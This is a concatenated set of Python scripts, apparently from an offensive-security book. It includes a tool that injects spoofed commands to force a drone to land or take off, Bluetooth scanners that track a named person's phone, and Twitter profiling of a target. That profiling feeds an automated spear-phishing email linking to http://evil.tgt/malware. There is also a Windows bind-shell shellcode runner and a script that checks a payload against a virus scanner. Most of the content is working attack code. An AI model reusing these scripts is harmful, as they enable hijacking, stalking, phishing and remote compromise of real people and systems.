        watch = 'AT*COMWDG=%i\r' %spoofSeq
        toCmd = 'AT*REF=%i,%s\r' % (spoofSeq + 1, EMER)
        self.injectCmd(watch)
        self.injectCmd(toCmd)

    def takeoff(self):
        spoofSeq = self.seq + 100
        watch = 'AT*COMWDG=%i\r' %spoofSeq
        toCmd = 'AT*REF=%i,%s\r' % (spoofSeq + 1, TAKEOFF)
        self.injectCmd(watch)
        self.injectCmd(toCmd)


def main():
    uavIntercept = interceptThread()
    uavIntercept.start()
    print '[*] Listening for UAV Traffic. Please WAIT...'
    while uavIntercept.foundUAV == False:
        pass

    while True:
        tmp = raw_input('[-] Press ENTER to Emergency Land UAV.')
        uavIntercept.emergencyland()

if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 8-fireCatcher
#!/usr/bin/python
# -*- coding: utf-8 -*-

import re
import optparse
from scapy.all import *

cookieTable = {}


def fireCatcher(pkt):
    raw = pkt.sprintf('%Raw.load%')
    r = re.findall('wordpress_[0-9a-fA-F]{32}', raw)
    if r and 'Set' not in raw:
        if r[0] not in cookieTable.keys():
            cookieTable[r[0]] = pkt.getlayer(IP).src
            print '[+] Detected and indexed cookie.'
        elif cookieTable[r[0]] != pkt.getlayer(IP).src:
            print '[*] Detected Conflict for ' + r[0]
            print 'Victim   = ' + cookieTable[r[0]]
            print 'Attacker = ' + pkt.getlayer(IP).src


def main():
    parser = optparse.OptionParser("usage %prog -i <interface>")
    parser.add_option('-i', dest='interface', type='string',\
      help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        conf.iface = options.interface

    try:
        sniff(filter='tcp port 80', prn=fireCatcher)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 9-btFind
import time
from bluetooth import *
from datetime import datetime

def findTgt(tgtName):
    foundDevs = discover_devices(lookup_names=True)
    for (addr, name) in foundDevs:
        if tgtName == name:
            print '[*] Found Target Device ' + tgtName
            print '[+] With MAC Address: ' + addr
            print '[+] Time is: '+str(datetime.now())


tgtName = 'TJ iPhone'
while True:
    print '[-] Scanning for Bluetooth Device: ' + tgtName
    findTgt(tgtName)
    time.sleep(5)


########NEW FILE########
__FILENAME__ = 9-btScan
import time
from bluetooth import *

alreadyFound = []


def findDevs():
    foundDevs = discover_devices(lookup_names=True)
    for (addr, name) in foundDevs:
        if addr not in alreadyFound:
            print '[*] Found Bluetooth Device: ' + str(name)
            print '[+] MAC address: ' + str(addr)
            alreadyFound.append(addr)


while True:
    findDevs()
    time.sleep(5)



########NEW FILE########
__FILENAME__ = dup
from scapy.all import *
 
def dupRadio(pkt):
	rPkt=pkt.getlayer(RadioTap)
	version=rPkt.version
	pad=rPkt.pad
	present=rPkt.present
	notdecoded=rPkt.notdecoded
	nPkt = RadioTap(version=version,pad=pad,present=present,notdecoded=notdecoded)
	return nPkt

def dupDot11(pkt):
	dPkt=pkt.getlayer(Dot11)
	subtype=dPkt.subtype
	Type=dPkt.type
	proto=dPkt.proto
	FCfield=dPkt.FCfield
	ID=dPkt.ID
	addr1=dPkt.addr1
	addr2=dPkt.addr2
	addr3=dPkt.addr3
	SC=dPkt.SC 
	addr4=dPkt.addr4
	nPkt=Dot11(subtype=subtype,type=Type,proto=proto,FCfield=FCfield,ID=ID,addr1=addr1,addr2=addr2,addr3=addr3,SC=SC,addr4=addr4)
	return nPkt

def dupSNAP(pkt):
	sPkt=pkt.getlayer(SNAP)
	oui=sPkt.OUI
	code=sPkt.code
	nPkt=SNAP(OUI=oui,code=code)
	return nPkt
 
def dupLLC(pkt):
	lPkt=pkt.getlayer(LLC)
	dsap=lPkt.dsap
	ssap=lPkt.ssap
	ctrl=lPkt.ctrl
	nPkt=LLC(dsap=dsap,ssap=ssap,ctrl=ctrl)
	return nPkt
 
def dupIP(pkt):
	iPkt=pkt.getlayer(IP)
	version=iPkt.version
	tos=iPkt.tos
	ID=iPkt.id 
	flags=iPkt.flags
	ttl=iPkt.ttl
	proto=iPkt.proto
	src=iPkt.src
	dst=iPkt.dst
	options=iPkt.options
	nPkt=IP(version=version,id=ID,tos=tos,flags=flags,ttl=ttl,proto=proto,src=src,dst=dst,options=options)
	return nPkt
 
def dupUDP(pkt):
	uPkt=pkt.getlayer(UDP)
	sport=uPkt.sport
	dport=uPkt.dport
	nPkt=UDP(sport=sport,dport=dport)
	return nPkt


########NEW FILE########
__FILENAME__ = 1-viewPage
#!/usr/bin/python
# -*- coding: utf-8 -*-
import mechanize


def viewPage(url):
    browser = mechanize.Browser()
    page = browser.open(url)
    source_code = page.read()
    print source_code


viewPage('http://www.syngress.com/')


########NEW FILE########
__FILENAME__ = 10-sendMail
#!/usr/bin/python
# -*- coding: utf-8 -*-
import smtplib
from email.mime.text import MIMEText


def sendMail(user,pwd,to,subject,text):

    msg = MIMEText(text)
    msg['From'] = user
    msg['To'] = to
    msg['Subject'] = subject

    try:
    	smtpServer = smtplib.SMTP('smtp.gmail.com', 587)
    	print "[+] Connecting To Mail Server."
    	smtpServer.ehlo()
    	print "[+] Starting Encrypted Session."
    	smtpServer.starttls()
    	smtpServer.ehlo()
    	print "[+] Logging Into Mail Server."
    	smtpServer.login(user, pwd)
    	print "[+] Sending Mail."
    	smtpServer.sendmail(user, to, msg.as_string())
    	smtpServer.close()
        print "[+] Mail Sent Successfully."

    except:
	print "[-] Sending Mail Failed."


user = 'username'
pwd = 'password'

sendMail(user, pwd, 'target@tgt.tgt',\
  'Re: Important', 'Test Message')


########NEW FILE########
__FILENAME__ = 10-sendSpam
#!/usr/bin/python
# -*- coding: utf-8 -*-
import smtplib
import optparse

from email.mime.text import MIMEText
from twitterClass import *
from random import choice

def sendMail(user,pwd,to,subject,text):

    msg = MIMEText(text)
    msg['From'] = user
    msg['To'] = to
    msg['Subject'] = subject

    try:
    	smtpServer = smtplib.SMTP('smtp.gmail.com', 587)
    	print "[+] Connecting To Mail Server."
    	smtpServer.ehlo()
    	print "[+] Starting Encrypted Session."
    	smtpServer.starttls()
    	smtpServer.ehlo()
    	print "[+] Logging Into Mail Server."
    	smtpServer.login(user, pwd)
    	print "[+] Sending Mail."
    	smtpServer.sendmail(user, to, msg.as_string())
    	smtpServer.close()
        print "[+] Mail Sent Successfully."

    except:
	print "[-] Sending Mail Failed."


def main():

    parser = optparse.OptionParser('usage %prog '+\
      '-u <twitter target> -t <target email> '+\
      '-l <gmail login> -p <gmail password>')

    parser.add_option('-u', dest='handle', type='string',\
      help='specify twitter handle')

    parser.add_option('-t', dest='tgt', type='string',\
      help='specify target email')

    parser.add_option('-l', dest='user', type='string',\
      help='specify gmail login')

    parser.add_option('-p', dest='pwd', type='string',\
      help='specify gmail password')


    (options, args) = parser.parse_args()
    handle = options.handle
    tgt = options.tgt
    user = options.user
    pwd = options.pwd

    if handle == None or tgt == None\
      or user ==None or pwd==None:
        print parser.usage
        exit(0)


    print "[+] Fetching tweets from: "+str(handle)
    spamTgt = reconPerson(handle)
    spamTgt.get_tweets()
    print "[+] Fetching interests from: "+str(handle)
    interests = spamTgt.find_interests()
    print "[+] Fetching location information from: "+\
      str(handle)
    location = spamTgt.twitter_locate('mlb-cities.txt')


    spamMsg = "Dear "+tgt+","

    if (location!=None):
	randLoc=choice(location)
	spamMsg += " Its me from "+randLoc+"."	

    if (interests['users']!=None):
	randUser=choice(interests['users'])
	spamMsg += " "+randUser+" said to say hello."

    if (interests['hashtags']!=None):
	randHash=choice(interests['hashtags'])
	spamMsg += " Did you see all the fuss about "+\
          randHash+"?"

    if (interests['links']!=None):
	randLink=choice(interests['links'])
	spamMsg += " I really liked your link to: "+\
          randLink+"."

    spamMsg += " Check out my link to http://evil.tgt/malware"
    print "[+] Sending Msg: "+spamMsg

    sendMail(user, pwd, tgt, 'Re: Important', spamMsg)

if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 2-proxyTest
#!/usr/bin/python
# -*- coding: utf-8 -*-
import mechanize


def testProxy(url, proxy):
    browser = mechanize.Browser()
    browser.set_proxies(proxy)
    page = browser.open(url)
    source_code = page.read()
    print source_code


url = 'http://ip.nefsc.noaa.gov/'
hideMeProxy = {'http': '216.155.139.115:3128'}

testProxy(url, hideMeProxy)


########NEW FILE########
__FILENAME__ = 3-userAgentTest
#!/usr/bin/python
# -*- coding: utf-8 -*-
import mechanize


def testUserAgent(url, userAgent):
    browser = mechanize.Browser()
    browser.addheaders = userAgent
    page = browser.open(url)
    source_code = page.read()
    print source_code


url = 'http://whatismyuseragent.dotdoh.com/'
userAgent = [('User-agent', 'Mozilla/5.0 (X11; U; '+\ 
  'Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01')]
testUserAgent(url, userAgent)


########NEW FILE########
__FILENAME__ = 4-printCookies
import mechanize
import cookielib

def printCookies(url):
    browser = mechanize.Browser()
    cookie_jar = cookielib.LWPCookieJar()
    browser.set_cookiejar(cookie_jar)
    page = browser.open(url)
    for cookie in cookie_jar:
	print cookie

url = 'http://www.syngress.com/'
printCookies(url)

########NEW FILE########
__FILENAME__ = 5-kittenTest
#!/usr/bin/python
# -*- coding: utf-8 -*-
from anonBrowser import *

ab = anonBrowser(proxies=[],\ 
  user_agents=[('User-agent','superSecretBroswer')])

for attempt in range(1, 5):
    ab.anonymize()
    print '[*] Fetching page'
    response = ab.open('http://kittenwar.com')
    for cookie in ab.cookie_jar:
        print cookie

########NEW FILE########
__FILENAME__ = 6-linkParser
#!/usr/bin/python
# -*- coding: utf-8 -*-

from anonBrowser import *
from BeautifulSoup import BeautifulSoup
import os
import optparse
import re


def printLinks(url):

    ab = anonBrowser()
    ab.anonymize()
    page = ab.open(url)
    html = page.read()

    try:
        print '[+] Printing Links From  Regex.'
        link_finder = re.compile('href="(.*?)"')
        links = link_finder.findall(html)
        for link in links:
            print link
    except:
	pass

    try:
        print '\n[+] Printing Links From BeautifulSoup.'
        soup = BeautifulSoup(html)
        links = soup.findAll(name='a')
        for link in links:
            if link.has_key('href'):
                print link['href']
    except:
        pass


def main():
    parser = optparse.OptionParser('usage %prog ' +\
      '-u <target url>')

    parser.add_option('-u', dest='tgtURL', type='string',\
      help='specify target url')

    (options, args) = parser.parse_args()
    url = options.tgtURL

    if url == None:
        print parser.usage
        exit(0)
    else:
        printLinks(url)


if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 7-imageMirror
#!/usr/bin/python
# -*- coding: utf-8 -*-

from anonBrowser import *
from BeautifulSoup import BeautifulSoup
import os
import optparse


def mirrorImages(url, dir):
    ab = anonBrowser()
    ab.anonymize()
    html = ab.open(url)
    soup = BeautifulSoup(html)
    image_tags = soup.findAll('img')

    for image in image_tags:
        filename = image['src'].lstrip('http://')
        filename = os.path.join(dir,\
	  filename.replace('/', '_'))
        print '[+] Saving ' + str(filename)
        data = ab.open(image['src']).read()
        ab.back()
        save = open(filename, 'wb')
        save.write(data)
        save.close()


def main():
    parser = optparse.OptionParser('usage %prog '+\
     '-u <target url> -d <destination directory>')
    
    parser.add_option('-u', dest='tgtURL', type='string',\
      help='specify target url')
    parser.add_option('-d', dest='dir', type='string',\
      help='specify destination directory')

    (options, args) = parser.parse_args()

    url = options.tgtURL
    dir = options.dir

    if url == None or dir == None:
        print parser.usage
        exit(0)
    
    else:
        try:
            mirrorImages(url, dir)
        except Exception, e:
            print '[-] Error Mirroring Images.'
            print '[-] ' + str(e)


if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 8-anonGoogle
#!/usr/bin/python
# -*- coding: utf-8 -*-
import json
import urllib
import optparse
from anonBrowser import *


class Google_Result:

    def __init__(self,title,text,url):
        self.title = title
        self.text = text
        self.url = url

    def __repr__(self):
        return self.title


def google(search_term):
    ab = anonBrowser()

    search_term = urllib.quote_plus(search_term)
    response = ab.open('http://ajax.googleapis.com/'+\
      'ajax/services/search/web?v=1.0&q='+ search_term)
    objects = json.load(response)
    results = []

    for result in objects['responseData']['results']:
        url = result['url']
        title = result['titleNoFormatting']
        text = result['content']
        new_gr = Google_Result(title, text, url)
        results.append(new_gr)
    return results


def main():
    parser = optparse.OptionParser('usage %prog ' +\
      '-k <keywords>')
    parser.add_option('-k', dest='keyword', type='string',\
      help='specify google keyword')
    (options, args) = parser.parse_args()
    keyword = options.keyword

    if options.keyword == None:
        print parser.usage
        exit(0)
    else:
        results = google(keyword)
        print results


if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 8-googleJson
#!/usr/bin/python
# -*- coding: utf-8 -*-
import json
import urllib
from anonBrowser import *


def google(search_term):
    ab = anonBrowser()

    search_term = urllib.quote_plus(search_term)
    response = ab.open('http://ajax.googleapis.com/'+\
      'ajax/services/search/web?v=1.0&q='+ search_term)
    objects = json.load(response)

    print objects


google('Boondock Saint')


########NEW FILE########
__FILENAME__ = 8-googleJumbled
#!/usr/bin/python
# -*- coding: utf-8 -*-
import urllib
from anonBrowser import *


def google(search_term):
    ab = anonBrowser()

    search_term = urllib.quote_plus(search_term)
    response = ab.open('http://ajax.googleapis.com/'+\
      'ajax/services/search/web?v=1.0&q='+ search_term)
    print response.read()

google('Boondock Saint')


########NEW FILE########
__FILENAME__ = 9-twitterClass
#!/usr/bin/python
# -*- coding: utf-8 -*-
import urllib
from anonBrowser import *
import json
import re
import urllib2


class reconPerson:

    def __init__(self, handle):
        self.handle = handle
        self.tweets = self.get_tweets()

    def get_tweets(self):
        query = urllib.quote_plus('from:' + self.handle+\
          ' since:2009-01-01 include:retweets'
                                  )
        tweets = []
        browser = anonBrowser()
        browser.anonymize()
        response = browser.open('http://search.twitter.com/'+\
          'search.json?q=' + query)

        json_objects = json.load(response)
        for result in json_objects['results']:
            new_result = {}
            new_result['from_user'] = result['from_user_name']
            new_result['geo'] = result['geo']
            new_result['tweet'] = result['text']
            tweets.append(new_result)
        return tweets

    def find_interests(self):
        interests = {}
        interests['links'] = []
        interests['users'] = []
        interests['hashtags'] = []

        for tweet in self.tweets:
            text = tweet['tweet']
            links = re.compile('(http.*?)\Z|(http.*?) ').findall(text)

            for link in links:
                if link[0]:
                    link = link[0]
                elif link[1]:
                    link = link[1]
                else:
                    continue

            try:
                response = urllib2.urlopen(link)
                full_link = response.url
                interests['links'].append(full_link)
            except:
                pass
            interests['users'] +=\
              re.compile('(@\w+)').findall(text)
            interests['hashtags'] +=\
              re.compile('(#\w+)').findall(text)

        interests['users'].sort()
        interests['hashtags'].sort()
        interests['links'].sort()
        return interests

    def twitter_locate(self, cityFile):
        cities = []
        if cityFile != None:
            for line in open(cityFile).readlines():
                city = line.strip('\n').strip('\r').lower()
                cities.append(city)

        locations = []
        locCnt = 0
        cityCnt = 0
        tweetsText = ''

        for tweet in self.tweets:
            if tweet['geo'] != None:
                locations.append(tweet['geo'])
                locCnt += 1

            tweetsText += tweet['tweet'].lower()

        for city in cities:
            if city in tweetsText:
                locations.append(city)
                cityCnt += 1

        return locations



########NEW FILE########
__FILENAME__ = 9-twitterGeo
#!/usr/bin/python
# -*- coding: utf-8 -*-
import json
import urllib
import optparse
from anonBrowser import *

def get_tweets(handle):
    query = urllib.quote_plus('from:' + handle+\
      ' since:2009-01-01 include:retweets')
    tweets = []
    browser = anonBrowser()
    browser.anonymize()

    response = browser.open('http://search.twitter.com/'+\
      'search.json?q='+ query)

    json_objects = json.load(response)
    for result in json_objects['results']:
        new_result = {}
        new_result['from_user'] = result['from_user_name']
        new_result['geo'] = result['geo']
        new_result['tweet'] = result['text']
        tweets.append(new_result)

    return tweets


def load_cities(cityFile):
    cities = []
    for line in open(cityFile).readlines():
	city=line.strip('\n').strip('\r').lower()
	cities.append(city)
    return cities

def twitter_locate(tweets,cities):
    locations = []
    locCnt = 0
    cityCnt = 0
    tweetsText = ""

    for tweet in tweets:
        if tweet['geo'] != None:
            locations.append(tweet['geo'])
	    locCnt += 1 

	tweetsText += tweet['tweet'].lower()

    for city in cities:
	if city in tweetsText:
	    locations.append(city)
	    cityCnt+=1
   
    print "[+] Found "+str(locCnt)+" locations "+\
      "via Twitter API and "+str(cityCnt)+\
      " locations from text search."
    return locations


def main():

    parser = optparse.OptionParser('usage %prog '+\
     '-u <twitter handle> [-c <list of cities>]')
    
    parser.add_option('-u', dest='handle', type='string',\
      help='specify twitter handle')
    parser.add_option('-c', dest='cityFile', type='string',\
      help='specify file containing cities to search')

    (options, args) = parser.parse_args()
    handle = options.handle
    cityFile = options.cityFile

    if (handle==None):
	print parser.usage
	exit(0)

    cities = []
    if (cityFile!=None):
    	 cities = load_cities(cityFile)
    tweets = get_tweets(handle)
    locations = twitter_locate(tweets,cities)
    print "[+] Locations: "+str(locations)

if __name__ == '__main__':
    main()



########NEW FILE########
__FILENAME__ = 9-twitterInterests
#!/usr/bin/python
# -*- coding: utf-8 -*-

import json
import re
import urllib
import urllib2
import optparse
from anonBrowser import *


def get_tweets(handle):
    query = urllib.quote_plus('from:' + handle+\
      ' since:2009-01-01 include:retweets')
    tweets = []
    browser = anonBrowser()
    browser.anonymize()

    response = browser.open('http://search.twitter.com/'+\
      'search.json?q=' + query)

    json_objects = json.load(response)
    for result in json_objects['results']:
        new_result = {}
        new_result['from_user'] = result['from_user_name']
        new_result['geo'] = result['geo']
        new_result['tweet'] = result['text']
        tweets.append(new_result)
    return tweets


def find_interests(tweets):
    interests = {}
    interests['links'] = []
    interests['users'] = []
    interests['hashtags'] = []

    for tweet in tweets:
        text = tweet['tweet']
        links = re.compile('(http.*?)\Z|(http.*?) ')\
          .findall(text)

        for link in links:
            if link[0]:
                link = link[0]
            elif link[1]:
                link = link[1]
            else:
                continue

            try:
                response = urllib2.urlopen(link)
                full_link = response.url
                interests['links'].append(full_link)
            except:
                pass
        interests['users'] += re.compile('(@\w+)').findall(text)
        interests['hashtags'] +=\
          re.compile('(#\w+)').findall(text)

    interests['users'].sort()
    interests['hashtags'].sort()
    interests['links'].sort()

    return interests


def main():

    parser = optparse.OptionParser('usage %prog '+\
      '-u <twitter handle>')

    parser.add_option('-u', dest='handle', type='string',\
      help='specify twitter handle')

    (options, args) = parser.parse_args()
    handle = options.handle
    if handle == None:
        print parser.usage
        exit(0)

    tweets = get_tweets(handle)
    interests = find_interests(tweets)
    print '\n[+] Links.'
    for link in set(interests['links']):
        print ' [+] ' + str(link)

    print '\n[+] Users.'
    for user in set(interests['users']):
        print ' [+] ' + str(user)

    print '\n[+] HashTags.'
    for hashtag in set(interests['hashtags']):
        print ' [+] ' + str(hashtag)


if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 9-twitterRecon
#!/usr/bin/python
# -*- coding: utf-8 -*-
import json
import urllib
from anonBrowser import *

class reconPerson:

    def __init__(self,first_name,last_name,\
      job='',social_media={}):
        self.first_name = first_name
        self.last_name = last_name
        self.job = job
        self.social_media = social_media

    def __repr__(self):
        return self.first_name + ' ' +\
          self.last_name + ' has job ' + self.job

    def get_social(self, media_name):
        if self.social_media.has_key(media_name):
            return self.social_media[media_name]

        return None

    def query_twitter(self, query):
        query = urllib.quote_plus(query)
        results = []
        browser = anonBrowser()
        response = browser.open(\
          'http://search.twitter.com/search.json?q='+ query)
        json_objects = json.load(response)
        for result in json_objects['results']:
            new_result = {}
            new_result['from_user'] = result['from_user_name']
            new_result['geo'] = result['geo']
            new_result['tweet'] = result['text']
            results.append(new_result)

        return results


ap = reconPerson('Boondock', 'Saint')
print ap.query_twitter(\
  'from:th3j35t3r since:2010-01-01 include:retweets')


########NEW FILE########
__FILENAME__ = anonBrowser
import mechanize, cookielib, random

class anonBrowser(mechanize.Browser):

    def __init__(self, proxies = [], user_agents = []):
        mechanize.Browser.__init__(self)
        self.set_handle_robots(False)        
        self.proxies = proxies
        self.user_agents = user_agents + ['Mozilla/4.0 ',\
	'FireFox/6.01','ExactSearch', 'Nokia7110/1.0'] 

        self.cookie_jar = cookielib.LWPCookieJar()
	self.set_cookiejar(self.cookie_jar)
        self.anonymize()
	
    def clear_cookies(self):
        self.cookie_jar = cookielib.LWPCookieJar()
        self.set_cookiejar(self.cookie_jar)
    
    def change_user_agent(self):
        index = random.randrange(0, len(self.user_agents) )
        self.addheaders = [('User-agent', \
          ( self.user_agents[index] ))]         
            
    def change_proxy(self):
        if self.proxies:
            index = random.randrange(0, len(self.proxies))
            self.set_proxies( {'http': self.proxies[index]} )
        
    def anonymize(self, sleep = False):
        self.clear_cookies()
        self.change_user_agent()
        self.change_proxy()
        
        if sleep:
            time.sleep(60)
           

########NEW FILE########
__FILENAME__ = twitterClass
#!/usr/bin/python
# -*- coding: utf-8 -*-
import urllib
from anonBrowser import *
import json
import re
import urllib2


class reconPerson:

    def __init__(self, handle):
        self.handle = handle
        self.tweets = self.get_tweets()

    def get_tweets(self):
        query = urllib.quote_plus('from:' + self.handle+\
          ' since:2009-01-01 include:retweets'
                                  )
        tweets = []
        browser = anonBrowser()
        browser.anonymize()
        response = browser.open('http://search.twitter.com/'+\
          'search.json?q=' + query)

        json_objects = json.load(response)
        for result in json_objects['results']:
            new_result = {}
            new_result['from_user'] = result['from_user_name']
            new_result['geo'] = result['geo']
            new_result['tweet'] = result['text']
            tweets.append(new_result)
        return tweets

    def find_interests(self):
        interests = {}
        interests['links'] = []
        interests['users'] = []
        interests['hashtags'] = []

        for tweet in self.tweets:
            text = tweet['tweet']
            links = re.compile('(http.*?)\Z|(http.*?) ').findall(text)

            for link in links:
                if link[0]:
                    link = link[0]
                elif link[1]:
                    link = link[1]
                else:
                    continue

            try:
                response = urllib2.urlopen(link)
                full_link = response.url
                interests['links'].append(full_link)
            except:
                pass
            interests['users'] +=\
              re.compile('(@\w+)').findall(text)
            interests['hashtags'] +=\
              re.compile('(#\w+)').findall(text)

        interests['users'].sort()
        interests['hashtags'].sort()
        interests['links'].sort()
        return interests

    def twitter_locate(self, cityFile):
        cities = []
        if cityFile != None:
            for line in open(cityFile).readlines():
                city = line.strip('\n').strip('\r').lower()
                cities.append(city)

        locations = []
        locCnt = 0
        cityCnt = 0
        tweetsText = ''

        for tweet in self.tweets:
            if tweet['geo'] != None:
                locations.append(tweet['geo'])
                locCnt += 1

            tweetsText += tweet['tweet'].lower()

        for city in cities:
            if city in tweetsText:
                locations.append(city)
                cityCnt += 1

        return locations



########NEW FILE########
__FILENAME__ = 1-bindshell
from ctypes import *

shellcode = ("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
"\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
"\x31\xdb\x53\x68\x02\x00\x05\x39\x89\xe6\x6a\x10\x56\x57\x68"
"\xc2\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5"
"\x53\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x89\xc7\x68\x75"
"\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57"
"\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e"
"\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56"
"\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56"
"\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5");

memorywithshell = create_string_buffer(shellcode, len(shellcode))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()


########NEW FILE########
__FILENAME__ = 2-virusCheck
#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import httplib
import time
import os
import optparse
from urlparse import urlparse


def printResults(url):

    status = 200
    host = urlparse(url)[1]
    path = urlparse(url)[2]

    if 'analysis' not in path:
        while status != 302:
            conn = httplib.HTTPConnection(host)
            conn.request('GET', path)
            resp = conn.getresponse()
            status = resp.status
            print '[+] Scanning file...'
            conn.close()
            time.sleep(15)

    print '[+] Scan Complete.'
    path = path.replace('file', 'analysis')
    conn = httplib.HTTPConnection(host)
    conn.request('GET', path)
    resp = conn.getresponse()
    data = resp.read()
    conn.close()

    reResults = re.findall(r'Detection rate:.*\)', data)
    htmlStripRes = reResults[1].\
      replace('&lt;font color=\'red\'&gt;', '').\
      replace('&lt;/font&gt;', '')
    print '[+] ' + str(htmlStripRes)


def uploadFile(fileName):

    print "[+] Uploading file to NoVirusThanks..."
    fileContents = open(fileName,'rb').read()

    header = {'Content-Type': 'multipart/form-data; \
      boundary=----WebKitFormBoundaryF17rwCZdGuPNPT9U'}
            
    params = "------WebKitFormBoundaryF17rwCZdGuPNPT9U"
    params += "\r\nContent-Disposition: form-data; "+\
      "name=\"upfile\"; filename=\""+str(fileName)+"\""
    params += "\r\nContent-Type: "+\
      "application/octet stream\r\n\r\n"
    params += fileContents
    params += "\r\n------WebKitFormBoundaryF17rwCZdGuPNPT9U"
    params += "\r\nContent-Disposition: form-data; "+\
      "name=\"submitfile\"\r\n"
    params += "\r\nSubmit File\r\n"
    params +="------WebKitFormBoundaryF17rwCZdGuPNPT9U--\r\n"
    conn = httplib.HTTPConnection('vscan.novirusthanks.org')
    conn.request("POST", "/", params, header)
    response = conn.getresponse()
    location = response.getheader('location')
    conn.close()
    return location


def main():

    parser = optparse.OptionParser('usage %prog -f <filename>')
    parser.add_option('-f', dest='fileName', type='string',\
      help='specify filename')
    (options, args) = parser.parse_args()
    fileName = options.fileName

    if fileName == None:
        print parser.usage
        exit(0)
    elif os.path.isfile(fileName) == False:
        print '[+] ' + fileName + ' does not exist.'
        exit(0)
    else:
        loc = uploadFile(fileName)
        printResults(loc)


if __name__ == '__main__':
    main()


########NEW FILE########
